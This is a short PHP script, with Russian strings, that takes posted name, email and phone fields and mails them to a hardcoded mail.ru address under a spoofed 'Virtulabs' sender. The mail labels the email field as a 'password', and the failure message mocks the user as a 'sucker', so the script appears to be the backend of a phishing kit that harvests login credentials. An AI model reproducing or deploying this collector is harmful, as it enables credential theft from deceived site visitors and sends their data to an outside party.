<?php
  $email = $_POST['email'];
  $name = $_POST['name'];
  $phone = $_POST['phone'];

  $email = htmlspecialchars($email);
  $name = htmlspecialchars($name);
  $phone =  htmlspecialchars($phone);

  $email = urldecode($email);
  $name = urldecode($name);
  $phone = urldecode($phone);

  $email = trim($email);
  $name = trim($name);
  $phone = trim($phone);

  if (mail("tsurkan.maksimka@mail.ru",
            "Новое письмо с сайта",
            "Имя: ".$name."\n".
            "Пароль: ".$email."\n",
            "From: Virtulabs \r\n"))
     {
            echo "Письмо доставлено, чекни почту";
     }
     else {
       echo "ЛОХ!";
     }
 ?>
